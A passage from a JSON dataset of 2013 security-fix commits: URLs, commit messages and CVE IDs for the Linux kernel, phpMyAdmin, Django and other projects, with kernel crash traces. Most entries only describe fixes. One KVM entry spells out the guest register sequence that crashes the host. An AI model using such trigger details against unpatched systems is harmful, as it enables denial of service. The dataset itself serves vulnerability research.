sock_has_perm+0x75/0x90[37598.994008] [<ffffffff815c3693>] inet_sendmsg+0x63/0xb0[37598.994008] [<ffffffff812a2973>] ? selinux_socket_sendmsg+0x23/0x30[37598.994008] [<ffffffff8153a450>] sock_sendmsg+0xb0/0xe0[37598.994008] [<ffffffff810135d1>] ? __switch_to+0x181/0x4a0[37598.994008] [<ffffffff8153d97d>] sys_sendto+0x12d/0x180[37598.994008] [<ffffffff810dfb64>] ? __audit_syscall_entry+0x94/0xf0[37598.994008] [<ffffffff81020ed1>] ? syscall_trace_enter+0x231/0x240[37598.994008] [<ffffffff8166a7e7>] tracesys+0xdd/0xe2[37598.994008] Code: fe 07 00 00 48 c7 c7 04 28 a6 81 89 45 a0 4c 89 4d b8 44 89 5d a8 e8 1b ac b1 ff 44 8b 5d a8 4c 8b 4d b8 8b 45 a0 e9 cf fe ff ff <0f> 0b 66 0f 1f 84 00 00 00 00 00 66 66 66 66 90 55 48 89 e5 48[37598.994008] RIP [<ffffffff815443a5>] skb_copy_and_csum_bits+0x325/0x330[37598.994008] RSP <ffff88003670da18>[37599.007323] ---[ end trace d69f6a17f8ac8eee ]---While there, also check if path mtu discovery is activated for thissocket. The logic was adapted from ip6_append_data when first writingon the corked socket.This bug was introduced with commit0c18337 (\"ipv6: fix incorrect ipsecfragment\").v2:a) Replace IPV6_PMTU_DISC_DO with IPV6_PMTUDISC_PROBE.b) Don't pass ipv6_pinfo to ip6_append_data_mtu (suggestion by Gao feng, thanks!).c) Change mtu to unsigned int, else we get a warning about non-matching types because of the min()-macro type-check.Acked-by: Gao feng <gaofeng@cn.fujitsu.com>Cc: YOSHIFUJI Hideaki <yoshfuji@linux-ipv6.org>Signed-off-by: Hannes Frederic Sowa <hannes@stressinduktion.org>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-4163"
    ],
    "cveIdsCount": 1
  },
  "ffb2a1aba9d3dd796f749b53706199163ddbe8f8664fb48cab2ad0593a135bec": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/012464268420e53a9cd81cbb4a43988d70393c36",
    "title": "[security] Global variables scope injection vulnerability (see PMASA-…",
    "body": "…2013-7)",
    "cveIds": [
      "CVE-2013-4729"
    ],
    "cveIdsCount": 1
  },
  "6386acf17ec88868cde7c9a1ce0c1a3edf120bc6990a431e855ea3ad44e4c8e5": {
    "url": "https://github.com/bigtreecms/BigTree-CMS/commit/8a59c2e13f8e151b6a9e98f73e641e1ec8d928df",
    "title": "Fixed a potential cross-site scripting issue on the module view add p…",
    "body": "…age.Thanks to High-Tech Bridge Security Research Lab for finding this and the Cross-Site Request Forgery issues.",
    "cveIds": [
      "CVE-2013-4880"
    ],
    "cveIdsCount": 1
  },
  "bd59a4929b932b87fc41df4c18341ef6b1f97eb193773d4e71297c3688a1575d": {
    "url": "https://github.com/bigtreecms/BigTree-CMS/commit/4b0faa90fa8b9e1776c86db716894dcd7e6b4834",
    "title": "Fixed a Cross-Site Request Forgery exploit that would allow logged-in…",
    "body": "… BigTree admins hitting a malicious page to automatically create / update users.",
    "cveIds": [
      "CVE-2013-4881",
      "CVE-2013-5313"
    ],
    "cveIdsCount": 2
  },
  "6e56c882e9480f2df5f59f9a54617d951caac810df6440a6fa40fabe9ad1428d": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/240b8332db53dedc27baeec5306dabad3bdece3b",
    "title": "Readd AllowThirdPartyFraming option",
    "body": "We want by default no framing of phpMyAdmin, but still some sites mightneed to embed it, so configuration option (with appropriate securitywarning) is there.This basically reverts d7e0bed.",
    "cveIds": [
      "CVE-2013-5029"
    ],
    "cveIdsCount": 1
  },
  "c02b860bd265856d5ee693ad2fc02924586bb6b843c7db2460dd67abeb578caf": {
    "url": "https://github.com/phpmyadmin/phpmyadmin/commit/24d0eb55203b029f250c77d63f2900ffbe099e8b",
    "title": "Improved protection against cross framing",
    "body": "We now include CSS to hide the page and display it conditionally afterchecking we're in top frame. This adds extra protection for clients whodo not support X-Frame-Options.See also http://en.wikipedia.org/wiki/Framekiller andhttps://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet",
    "cveIds": [
      "CVE-2013-5029"
    ],
    "cveIdsCount": 1
  },
  "8f5c519c13448fe249332893fbd0f5789f8db3b283cae67aaeb86cc6d0b708fb": {
    "url": "https://github.com/torvalds/linux/commit/e8180dcaa8470ceca21109f143876fdcd9fe050a",
    "title": "ARM: KVM: prevent NULL pointer dereferences with KVM VCPU ioctl",
    "body": "Some ARM KVM VCPU ioctls require the vCPU to be properly initializedwith the KVM_ARM_VCPU_INIT ioctl before being used with furtherrequests. KVM_RUN checks whether this initialization has beendone, but other ioctls do not.Namely KVM_GET_REG_LIST will dereference an array with index -1without initialization and thus leads to a kernel oops.Fix this by adding checks before executing the ioctl handlers. [ Removed superflous comment from static function - Christoffer ]Changes from v1: * moved check into a static function with a meaningful nameSigned-off-by: Andre Przywara <andre.przywara@linaro.org>Signed-off-by: Christoffer Dall <cdall@cs.columbia.edu>",
    "cveIds": [
      "CVE-2013-5634"
    ],
    "cveIdsCount": 1
  },
  "73fdcfce1702b985133347abac9f72a81321962528e35d4277f338f43518c2b1": {
    "url": "https://github.com/microweber/microweber/commit/9177d134960c24cb642d5cf3b42a1fba286219cc",
    "title": "fix of CVE HTB23175",
    "body": "https://www.htbridge.com/advisory/HTB23175",
    "cveIds": [
      "CVE-2013-5984"
    ],
    "cveIdsCount": 1
  },
  "fa5962f0e52364a9f865152423b824b2548f68fa639286c4af95cf2569316bef": {
    "url": "https://github.com/django/django/commit/ec67af0bd609c412b76eaa4cc89968a2a8e5ad6a",
    "title": "Fixed is_safe_url() to reject URLs that use a scheme other than HTTP/S.",
    "body": "This is a security fix; disclosure to follow shortly.",
    "cveIds": [
      "CVE-2013-6044"
    ],
    "cveIdsCount": 1
  },
  "1ae43330120c6dff141e53952ef880dce32ce35f720612f53072127581f8519c": {
    "url": "https://github.com/django/django/commit/ae3535169af804352517b7fea94a42a1c9c4b762",
    "title": "Fixed is_safe_url() to reject URLs that use a scheme other than HTTP/S.",
    "body": "This is a security fix; disclosure to follow shortly.",
    "cveIds": [
      "CVE-2013-6044"
    ],
    "cveIdsCount": 1
  },
  "c9cd4a13ba9b7e2cb0500e3cf7ab0ad46d6b21551897589a48a85d9b6248b199": {
    "url": "https://github.com/django/django/commit/1a274ccd6bc1afbdac80344c9b6e5810c1162b5f",
    "title": "Fixed is_safe_url() to reject URLs that use a scheme other than HTTP/S.",
    "body": "This is a security fix; disclosure to follow shortly.",
    "cveIds": [
      "CVE-2013-6044"
    ],
    "cveIdsCount": 1
  },
  "918681e86809de29d97334fe6d8b9debc75558e5ccebb353cc0db9d97485508e": {
    "url": "https://github.com/munin-monitoring/munin/commit/284d7402718d98fcf10cee565415939882abab99",
    "title": "master: avoid an endless loop in HTML generation",
    "body": "Safeguard to avoid any bigger loop than 100 nested levels. It protects againstapplication bugs in the parsing code.Thx Christoph Biedl (debian.axhn@manchmal.in-ulm.de) for noticingand for providing a patchCloses: C:CVE-2013-6048",
    "cveIds": [
      "CVE-2013-6048"
    ],
    "cveIdsCount": 1
  },
  "e2b95e2110d9f00d1fdf60013a997b51223e93d8fbaee61609ff12188b5f41d1": {
    "url": "https://github.com/torvalds/linux/commit/8404663f81d212918ff85f493649a7991209fa04",
    "title": "ARM: 7527/1: uaccess: explicitly check __user pointer when !CPU_USE_D…",
    "body": "…OMAINSThe {get,put}_user macros don't perform range checking on the provided__user address when !CPU_HAS_DOMAINS.This patch reworks the out-of-line assembly accessors to check the useraddress against a specified limit, returning -EFAULT if is is out ofrange.[will: changed get_user register allocation to match put_user][rmk: fixed building on older ARM architectures]Reported-by: Catalin Marinas <catalin.marinas@arm.com>Signed-off-by: Will Deacon <will.deacon@arm.com>Cc: stable@vger.kernel.orgSigned-off-by: Russell King <rmk+kernel@arm.linux.org.uk>",
    "cveIds": [
      "CVE-2013-6282"
    ],
    "cveIdsCount": 1
  },
  "c658548b516b2c5b9d8f4b014de1c936665d216aa33120165fa3fe9606549da0": {
    "url": "https://github.com/torvalds/linux/commit/b963a22e6d1a266a67e9eecc88134713fd54775c",
    "title": "KVM: x86: Fix potential divide by 0 in lapic (CVE-2013-6367)",
    "body": "Under guest controllable circumstances apic_get_tmcct will execute adivide by zero and cause a crash. If the guest cpuid supporttsc deadline timers and performs the following sequence of requeststhe host will crash.- Set the mode to periodic- Set the TMICT to 0- Set the mode bits to 11 (neither periodic, nor one shot, nor tsc deadline)- Set the TMICT to non-zero.Then the lapic_timer.period will be 0, but the TMICT will not be. If theguest then reads from the TMCCT then the host will perform a divide by 0.This patch ensures that if the lapic_timer.period is 0, then the divisiondoes not occur.Reported-by: Andrew Honig <ahonig@google.com>Cc: stable@vger.kernel.orgSigned-off-by: Andrew Honig <ahonig@google.com>Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>",
    "cveIds": [
      "CVE-2013-6367"
    ],
    "cveIdsCount": 1
  },
  "dc534e9e573b383d4bf278434992db0a4bbdfcc89fd44cf359df5d0619ffa876": {
    "url": "https://github.com/torvalds/linux/commit/fda4e2e85589191b123d31cdc21fd33ee70f50fd",
    "title": "KVM: x86: Convert vapic synchronization to _cached functions (CVE-201…",
    "body": "…3-6368)In kvm_lapic_sync_from_vapic and kvm_lapic_sync_to_vapic there is thepotential to corrupt kernel memory if userspace provides an address thatis at the end of a page. This patches concerts those functions to usekvm_write_guest_cached and kvm_read_guest_cached. It also checks thevapic_address specified by userspace during ioctl processing and returnsan error to userspace if the address is not a valid GPA.This is generally not guest triggerable, because the required write isdone by firmware that runs before the guest. Also, it only affects AMDprocessors and oldish Intel that do not have the FlexPriority feature(unless you disable FlexPriority, of course; then newer processors arealso affected).Fixes: b93463a ('KVM: Accelerated apic support')Reported-by: Andrew Honig <ahonig@google.com>Cc: stable@vger.kernel.orgSigned-off-by: Andrew Honig <ahonig@google.com>Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>",
    "cveIds": [
      "CVE-2013-6368"
    ],
    "cveIdsCount": 1
  },
  "2408c3294abd7ce0376c13c30e66f0e3c41df7a6644f7501b507b46f572e5742": {
    "url": "https://github.com/json-c/json-c/commit/64e36901a0614bf64a19bc3396469c66dcd0b015",
    "title": "Patch to address the following issues:",
    "body": "* CVE-2013-6371: hash collision denial of service* CVE-2013-6370: buffer overflow if size_t is larger than int",
    "cveIds": [
      "CVE-2013-6370",
      "CVE-2013-6371"
    ],
    "cveIdsCount": 2
  },
  "7149358e2ecab1d29a92380d718ff6a67372af08ebd7e60eb40d1f7a37603ec1": {
    "url": "https://github.com/torvalds/linux/commit/17d68b763f09a9ce824ae23eb62c9efc57b69271",
    "title": "KVM: x86: fix guest-initiated crash with x2apic (CVE-2013-6376)",
    "body": "A guest can cause a BUG_ON() leading to a host kernel crash.When the guest writes to the ICR to request an IPI, while in x2apicmode the following things happen, the destination is read fromICR2, which is a register that the guest can control.kvm_irq_delivery_to_apic_fast uses the high 16 bits of ICR2 as thecluster id. A BUG_ON is triggered, which is a protection againstaccessing map->logical_map with an out-of-bounds access and managesto avoid that anything really unsafe occurs.The logic in the code is correct from real HW point of view. The problemis that KVM supports only one cluster with ID 0 in clustered mode, butthe code that has the bug does not take this into account.Reported-by: Lars Bull <larsbull@google.com>Cc: stable@vger.kernel.orgSigned-off-by: Gleb Natapov <gleb@redhat.com>Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>",
    "cveIds": [
      "CVE-2013-6376"
    ],
    "cveIdsCount": 1
  },
  "bd41d4e0cb3731bbc57eb7e0249b0bcd06473b26285df56dbc30120a8895f080": {
    "url": "https://github.com/torvalds/linux/commit/a497e47d4aec37aaf8f13509f3ef3d1f6a717d88",
    "title": "libertas: potential oops in debugfs",
    "body": "If we do a zero size allocation then it will oops. Also we can't besure the user passes us a NUL terminated string so I've added aterminator.This code can only be triggered by root.Reported-by: Nico Golde <nico@ngolde.de>Reported-by: Fabian Yamaguchi <fabs@goesec.de>Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>Acked-by: Dan Williams <dcbw@redhat.com>Signed-off-by: John W. Linville <linville@tuxdriver.com>",
    "cveIds": [
      "CVE-2013-6378"
    ],
    "cveIdsCount": 1
  },
  "67a7fd8c61e1d08811e7418b9ebcd68061749616264d52f6448e52791070f779": {
    "url": "https://github.com/torvalds/linux/commit/b4789b8e6be3151a955ade74872822f30e8cd914",
    "title": "aacraid: prevent invalid pointer dereference",
    "body": "It appears that driver runs into a problem here if fibsize is too smallbecause we allocate user_srbcmd with fibsize size only but later weaccess it until user_srbcmd->sg.count to copy it over to srbcmd.It is not correct to test (fibsize < sizeof(*user_srbcmd)) because thisstructure already includes one sg element and this is not needed forcommands without data. So, we would recommend to add the following(instead of test for fibsize == 0).Signed-off-by: Mahesh Rajashekhara <Mahesh.Rajashekhara@pmcs.com>Reported-by: Nico Golde <nico@ngolde.de>Reported-by: Fabian Yamaguchi <fabs@goesec.de>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2013-6380"
    ],
    "cveIdsCount": 1
  },
  "8c29ebfd56b90bbdbb5d023cda9d75f93fb3c226c1c3659095aab13a718aae48": {
    "url": "https://github.com/torvalds/linux/commit/6fb392b1a63ae36c31f62bc3fc8630b49d602b62",
    "title": "qeth: avoid buffer overflow in snmp ioctl",
    "body": "Check user-defined length in snmp ioctl request and allow requestonly if it fits into a qeth command buffer.Signed-off-by: Ursula Braun <ursula.braun@de.ibm.com>Signed-off-by: Frank Blaschka <frank.blaschka@de.ibm.com>Reviewed-by: Heiko Carstens <heicars2@linux.vnet.ibm.com>Reported-by: Nico Golde <nico@ngolde.de>Reported-by: Fabian Yamaguchi <fabs@goesec.de>Cc: <stable@vger.kernel.org>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-6381"
    ],
    "cveIdsCount": 1
  },
  "f12ba27317323fd52a34c39c20f6f4e1d43efed7b4e2b2a9a2abe7bce6a429ff": {
    "url": "https://github.com/torvalds/linux/commit/f856567b930dfcdbc3323261bf77240ccdde01f5",
    "title": "aacraid: missing capable() check in compat ioctl",
    "body": "In commit d496f94 ('[SCSI] aacraid: fix security weakness') weadded a check on CAP_SYS_RAWIO to the ioctl. The compat ioctls need thecheck as well.Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>Cc: stable@kernel.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2013-6383"
    ],
    "cveIdsCount": 1
  },
  "01fcbb45b1fd697f9a6f0774da7b02aa4915b1c06aa921d25e494c7830407f84": {
    "url": "https://github.com/akheron/jansson/commit/8f80c2d83808150724d31793e6ade92749b1faa4",
    "title": "CVE-2013-6401: Change hash function, randomize hashes",
    "body": "Thanks to Florian Weimer and Eric Sesterhenn for reporting, reviewingand testing.",
    "cveIds": [
      "CVE-2013-6401"
    ],
    "cveIdsCount": 1
  },
  "d89c2e823c12968b51483cfe690cc98fff3291da8a93e239339718949b6c6ad6": {
    "url": "https://github.com/quassel/quassel/commit/a1a24da",
    "title": "Make sure that clients can't access buffers belonging to other users",
    "body": "A manipulated, but properly authenticated client was able to retrievethe backlog of other users on the same core in some cases by providingan appropriate BufferID to the storage engine. Note that properauthentication was still required, so exploiting this requiresmalicious users on your core. This commit fixes this issue by ensuringthat foreign BufferIDs are off-limits.",
    "cveIds": [
      "CVE-2013-6404"
    ],
    "cveIdsCount": 1
  },
  "5dde7dfd34f88f64b92e7107e1e1306d88b61d48cc22d2278f7c8cf95645f564": {
    "url": "https://github.com/hercules-team/augeas/commit/f5b4fc0c",
    "title": "Fix umask handling when creating new files",
    "body": "* src/transform.c (transform_save): faulty umask arithmetic would cause overly-open file modes when the umask contains \"7\", as the umask was incorrectly subtracted from the target file modeFixes CVE-2013-6412, RHBZ#1034261",
    "cveIds": [
      "CVE-2013-6412"
    ],
    "cveIdsCount": 1
  },
  "7f90eb5dd0989f652670d7554db211792c943862019d819a81402e827764a1c5": {
    "url": "https://github.com/spring-projects/spring-framework/commit/7a7df6637478607bef0277bf52a4e0a03e20a248",
    "title": "Update JavaScriptUtils",
    "body": "Add escaping for <, >, and PS/LS line terminatorsIssue: SPR-9983",
    "cveIds": [
      "CVE-2013-6430"
    ],
    "cveIdsCount": 1
  },
  "e52e6577e1e035c04c5725905d909f1bf8f45e5e2ec0217a1fa654f5e45fd951": {
    "url": "https://github.com/torvalds/linux/commit/ae7b4e1f213aa659aedf9c6ecad0bf5f0476e1e2",
    "title": "net: fib: fib6_add: fix potential NULL pointer dereference",
    "body": "When the kernel is compiled with CONFIG_IPV6_SUBTREES, and we returnwith an error in fn = fib6_add_1(), then error codes are encoded intothe return pointer e.g. ERR_PTR(-ENOENT). In such an error case, wewrite the error code into err and jump to out, hence enter the if(err)condition. Now, if CONFIG_IPV6_SUBTREES is enabled, we check for: if (pn != fn && pn->leaf == rt) ... if (pn != fn && !pn->leaf && !(pn->fn_flags & RTN_RTINFO)) ...Since pn is NULL and fn is f.e. ERR_PTR(-ENOENT), then pn != fnevaluates to true and causes a NULL-pointer dereference on furtherchecks on pn. Fix it, by setting both NULL in error case, so thatpn != fn already evaluates to false and no further dereferencetakes place.This was first correctly implemented in 4a287eb (\"IPv6 routing,NLM_F_* flag support: REPLACE and EXCL flags support, warn aboutmissing CREATE flag\"), but the bug got later on introduced by188c517 (\"ipv6: return errno pointers consistently for fib6_add_1()\").Signed-off-by: Daniel Borkmann <dborkman@redhat.com>Cc: Lin Ming <mlin@ss.pku.edu.cn>Cc: Matti Vaittinen <matti.vaittinen@nsn.com>Cc: Hannes Frederic Sowa <hannes@stressinduktion.org>Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>Acked-by: Matti Vaittinen <matti.vaittinen@nsn.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-6431"
    ],
    "cveIdsCount": 1
  },
  "c750e7202d854dbaedf005f1b6361b96a7af067c84c63bbbbe62383071e5a3d0": {
    "url": "https://github.com/lxc/lxc/commit/f4d5cc8e1f39d132b61e110674528cac727ae0e2",
    "title": "sshd: Don't bind-mount /sbin/init read-write",
    "body": "lxc-sshd was mounting itself (the template script) as /sbin/init in thecontainer using a writable bind-mount.This shouldn't be needed and could lead to quite a few problems shouldone of those containers overwrite /sbin/init for some reason.Instead simply move to a read-only bind-mount which should prevent anyaccidental dammage.Signed-off-by: Stéphane Graber <stgraber@ubuntu.com>",
    "cveIds": [
      "CVE-2013-6441"
    ],
    "cveIdsCount": 1
  },
  "64e11900d904aadb06c9b10e5f66ff5d2bc69484f54916bbf8389567540a3429": {
    "url": "https://github.com/seam2/jboss-seam/commit/090aa6252affc978a96c388e3fc2c1c2688d9bb5",
    "title": "https://issues.jboss.org/browse/WFK2-375 enhanced fix",
    "body": "git-svn-id: https://svn.jboss.org/repos/seam/branches/enterprise/WFK-2_1@15651 a9c07ecc-ef43-0410-a306-c911db474e88",
    "cveIds": [
      "CVE-2013-6447",
      "CVE-2013-6448"
    ],
    "cveIdsCount": 2
  },
  "4ad28aebbddfcbdea0be9b52b802253e4d7b6b5925f37518cc5702246c373af1": {
    "url": "https://github.com/torvalds/linux/commit/7314e613d5ff9f0934f7a0f74ed7973b903315d1",
    "title": "Fix a few incorrectly checked [io_]remap_pfn_range() calls",
    "body": "Nico Golde reports a few straggling uses of [io_]remap_pfn_range() thatreally should use the vm_iomap_memory() helper. This trivially convertstwo of them to the helper, and comments about why the third one reallyneeds to continue to use remap_pfn_range(), and adds the missing sizecheck.Reported-by: Nico Golde <nico@ngolde.de>Cc: stable@kernel.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org.",
    "cveIds": [
      "CVE-2013-6763"
    ],
    "cveIdsCount": 1
  },
  "4115313ebbe40a2c00ee463b04bf1045b80c7fdd5208d4f002ff0dfd5ffa8b0e": {
    "url": "https://github.com/rackerlabs/openstack-guest-agents-windows-xenserver/commit/ef16f88f20254b8083e361f11707da25f8482401",
    "title": "Updated the agent and updater to use IPC communications rather than T…",
    "body": "…CP. Altered the updater update command to make it more resilient and updated the version number for a new build.",
    "cveIds": [
      "CVE-2013-6795"
    ],
    "cveIdsCount": 1
  },
  "bbf120cd16583df75def7daf9994f69d4b8ad18be67624bc12b51ce03022aefa": {
    "url": "https://github.com/torvalds/linux/commit/c2349758acf1874e4c2b93fe41d072336f1a31d0",
    "title": "rds: prevent dereference of a NULL device",
    "body": "Binding might result in a NULL device, which is dereferencedcausing this BUG:[ 1317.260548] BUG: unable to handle kernel NULL pointer dereference at 0000000000000974[ 1317.261847] IP: [<ffffffff84225f52>] rds_ib_laddr_check+0x82/0x110[ 1317.263315] PGD 418bcb067 PUD 3ceb21067 PMD 0[ 1317.263502] Oops: 0000 [#1] PREEMPT SMP DEBUG_PAGEALLOC[ 1317.264179] Dumping ftrace buffer:[ 1317.264774] (ftrace buffer empty)[ 1317.265220] Modules linked in:[ 1317.265824] CPU: 4 PID: 836 Comm: trinity-child46 Tainted: G W 3.13.0-rc4-next-20131218-sasha-00013-g2cebb9b-dirty #4159[ 1317.267415] task: ffff8803ddf33000 ti: ffff8803cd31a000 task.ti: ffff8803cd31a000[ 1317.268399] RIP: 0010:[<ffffffff84225f52>] [<ffffffff84225f52>] rds_ib_laddr_check+0x82/0x110[ 1317.269670] RSP: 0000:ffff8803cd31bdf8 EFLAGS: 00010246[ 1317.270230] RAX: 0000000000000000 RBX: ffff88020b0dd388 RCX: 0000000000000000[ 1317.270230] RDX: ffffffff8439822e RSI: 00000000000c000a RDI: 0000000000000286[ 1317.270230] RBP: ffff8803cd31be38 R08: 0000000000000000 R09: 0000000000000000[ 1317.270230] R10: 0000000000000000 R11: 0000000000000001 R12: 0000000000000000[ 1317.270230] R13: 0000000054086700 R14: 0000000000a25de0 R15: 0000000000000031[ 1317.270230] FS: 00007ff40251d700(0000) GS:ffff88022e200000(0000) knlGS:0000000000000000[ 1317.270230] CS: 0010 DS: 0000 ES: 0000 CR0: 000000008005003b[ 1317.270230] CR2: 0000000000000974 CR3: 00000003cd478000 CR4: 00000000000006e0[ 1317.270230] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000[ 1317.270230] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000090602[ 1317.270230] Stack:[ 1317.270230] 0000000054086700 5408670000a25de0 5408670000000002 0000000000000000[ 1317.270230] ffffffff84223542 00000000ea54c767 0000000000000000 ffffffff86d26160[ 1317.270230] ffff8803cd31be68 ffffffff84223556 ffff8803cd31beb8 ffff8800c6765280[ 1317.270230] Call Trace:[ 1317.270230] [<ffffffff84223542>] ? rds_trans_get_preferred+0x42/0xa0[ 1317.270230] [<ffffffff84223556>] rds_trans_get_preferred+0x56/0xa0[ 1317.270230] [<ffffffff8421c9c3>] rds_bind+0x73/0xf0[ 1317.270230] [<ffffffff83e4ce62>] SYSC_bind+0x92/0xf0[ 1317.270230] [<ffffffff812493f8>] ? context_tracking_user_exit+0xb8/0x1d0[ 1317.270230] [<ffffffff8119313d>] ? trace_hardirqs_on+0xd/0x10[ 1317.270230] [<ffffffff8107a852>] ? syscall_trace_enter+0x32/0x290[ 1317.270230] [<ffffffff83e4cece>] SyS_bind+0xe/0x10[ 1317.270230] [<ffffffff843a6ad0>] tracesys+0xdd/0xe2[ 1317.270230] Code: 00 8b 45 cc 48 8d 75 d0 48 c7 45 d8 00 00 00 00 66 c7 45 d0 02 0089 45 d4 48 89 df e8 78 49 76 ff 41 89 c4 85 c0 75 0c 48 8b 03 <80> b8 74 09 00 00 01 74 06 41 bc 9d ff ff ff f6 05 2a b6 c2 02[ 1317.270230] RIP [<ffffffff84225f52>] rds_ib_laddr_check+0x82/0x110[ 1317.270230] RSP <ffff8803cd31bdf8>[ 1317.270230] CR2: 0000000000000974Signed-off-by: Sasha Levin <sasha.levin@oracle.com>Signed-off-by: David S. Miller <davem@davemloft.net>",
    "cveIds": [
      "CVE-2013-7339"
    ],
    "cveIdsCount": 1
  },
  "c992e60895610f42ee79ea0addeb3d13299a8bb0baf5c21860384ed6758df267": {
    "url": "https://github.com/flowplayer/flowplayer/commit/017f8c2a0865ab31e01d591adc43d34f2dd60e59",
    "title": "Merge pull request #382 from flowplayer/bug/381",
    "body": "don't accept callback to be passed in the query string (#381)",
    "cveIds": [
      "CVE-2013-7342"
    ],
    "cveIdsCount": 1
  },
  "02fe7cfafd7da35a265aa748fc6dc99e33195e37bf3165c83c82e46ae831ed9c": {
    "url": "https://github.com/flowplayer/flowplayer/commit/27e8f178276c185cbddb4f14c91d4ce7b3865db1",
    "title": "Merge pull request #578 from flowplayer/bug/381",
    "body": "Decode the URL before checking the callback param.",
    "cveIds": [
      "CVE-2013-7343"
    ],
    "cveIdsCount": 1
  },
  "e2a835d12763b21f6d227e5f6baa5a4a7d6f11a926a41c984298d849440625dd": {
    "url": "https://github.com/torvalds/linux/commit/d558023207e008a4476a3b7bb8706b2a2bf5d84f",
    "title": "aio: prevent double free in ioctx_alloc",
    "body": "ioctx_alloc() calls aio_setup_ring() to allocate a ring. If aio_setup_ring()fails to do so it would call aio_free_ring() before returning, butioctx_alloc() would call aio_free_ring() again causing a double free ofthe ring.This is easily reproducible from userspace.Signed-off-by: Sasha Levin <sasha.levin@oracle.com>Signed-off-by: Benjamin LaHaise <bcrl@kvack.org>",
    "cveIds": [
      "CVE-2013-7348"
    ],
    "cveIdsCount": 1
  },
  "960fcad0a735da92c915ff6b39bd31e35e201d12861a0d86fc2ab2e5ca80cf7e": {
    "url": "https://github.com/sebsauvage/Shaarli/commit/53da201749f8f362323ef278bf338f1d9f7a925a",
    "title": "XSS flaw correction",
    "body": "Closes issue #134",
    "cveIds": [
      "CVE-2013-7351"
    ],
    "cveIdsCount": 1
  },
  "cd7f40949128e30bd3339d86f123c94b9d2c218043cb0ed4b8025529849123f9": {
    "url": "https://github.com/torvalds/linux/commit/5d26a105b5a73e5635eae0629b42fa0a90e07b7b",
    "title": "crypto: prefix module autoloading with \"crypto-\"",
    "body": "This prefixes all crypto module loading with \"crypto-\" so we never runthe risk of exposing module auto-loading to userspace via a crypto API,as demonstrated by Mathias Krause:https://lkml.org/lkml/2013/3/4/70Signed-off-by: Kees Cook <keescook@chromium.org>Signed-off-by: Herbert Xu <herbert@gondor.apana.org.au>",
    "cveIds": [
      "CVE-2013-7421"
    ],
    "cveIdsCount": 1
  },
  "cd5e2f34855e605b55372445303bc1ccefa7a003f76465fef7f7e4b82f12aa80": {
    "url": "https://github.com/kanaka/noVNC/commit/ad941faddead705cd611921730054767a0b32dcd",
    "title": "Adds support for secure attribute on token cookie",
    "body": "This patch adds support for the secure attribute on tokencookies (sent by nova-novncproxy). If the https is usedto transfer the cookie, the secure attribute is set thusrestricting server requestes to secure conections only.This should prevent man-in-the-middle attacks.",
    "cveIds": [
      "CVE-2013-7436"
    ],
    "cveIdsCount": 1
  },
  "92d3680ccc6dd7f4d63577bd334f38266978f189537dec294cda8f31dd227353": {
    "url": "https://github.com/yoe/nbd/commit/741495cb08503fd32a9d22648e63b64390c601f4",
    "title": "nbd-server: handle modern-style negotiation in a child process",
    "body": "Previously, the modern style negotiation was carried out in the rootserver (listener) process before forking the actual client handler. Thismade it possible for a malfunctioning or evil client to terminate theroot process simply by querying a non-existent export or aborting in themiddle of the negotation process (caused SIGPIPE in the server).This commit moves the negotiation process to the child to keep the rootprocess up and running no matter what happens during the negotiation.See http://sourceforge.net/mailarchive/message.php?msg_id=30410146Signed-off-by: Tuomas Räsänen <tuomasjjrasanen@tjjr.fi>",
    "cveIds": [
      "CVE-2013-7441"
    ],
    "cveIdsCount": 1
  },
  "ecb8a23e007d204d29e31cefdf39dbb210475e9b7e1350826e0d70a6ead610ae": {
    "url": "https://github.com/wikimedia/mediawiki/commit/dc2966bd05b69321300c63fd0bd78e7c78ecea6e",
    "title": "Prevent Special:Contributions from indicating that an IP address is a…",
    "body": "…utoblockedIf an IP address was autoblocked in the userlinks, sysops would see\"change block\" and \"unblock\", indicating that the IP is autoblocked.Now Special:Contributions will only display \"change block\" if the useris blocked and the block type is not Block::TYPE_AUTO. This is the samecheck which is used above when deciding whether to display theblock log extract.Bug: 46457Change-Id: I43047059cb67527d5296322ac17fe798db917bec",
    "cveIds": [
      "CVE-2013-7444"
    ],
    "cveIdsCount": 1
  },
  "87ad4d8d0421a802a7d5e4bd02d1c877b3c325d261fe53d74aff9be090c7942d": {
    "url": "https://github.com/hexchat/hexchat/commit/c9b63f7f9be01692b03fa15275135a4910a7e02d",
    "title": "ssl: Validate hostnames",
    "body": "Closes #524",
    "cveIds": [
      "CVE-2013-7449"
    ],
    "cveIdsCount": 1
  },
  "18505665e3ad13b69ef5b96e66574397c5948f6beba9dfcdc463eba554751320": {
    "url": "https://github.com/libgd/libgd/commit/4f65a3e4eedaffa1efcf9ee1eb08f0b504fbc31a",
    "title": "Fixed memory overrun bug in gdImageScaleTwoPass",
    "body": "_gdContributionsCalc would compute a window size and then adjustthe left and right positions of the window to make a window withinthat size. However, it was storing the values in the struct *before*it made the adjustment. This change fixes that.",
    "cveIds": [
      "CVE-2013-7456"
    ],
    "cveIdsCount": 1
  },
  "c133ccc1ce783dec5d802a1ff4e8faa43394db05420e39c7583f517008566dfe": {
    "url": "https://github.com/php/php-src/commit/7a1aac3343af85b4af4df5f8844946eaa27394ab?w=1",
    "title": "Fixed bug #72227: imagescale out-of-bounds read",
    "body": "Ported from libgd/libgd@4f65a3e",
    "cveIds": [
      "CVE-2013-7456"
    ],
    "cveIdsCount": 1
  },
  "41a9128e7b56d44bba8818e139c0513b3612af385f2a677fa50cd28e3b719675": {
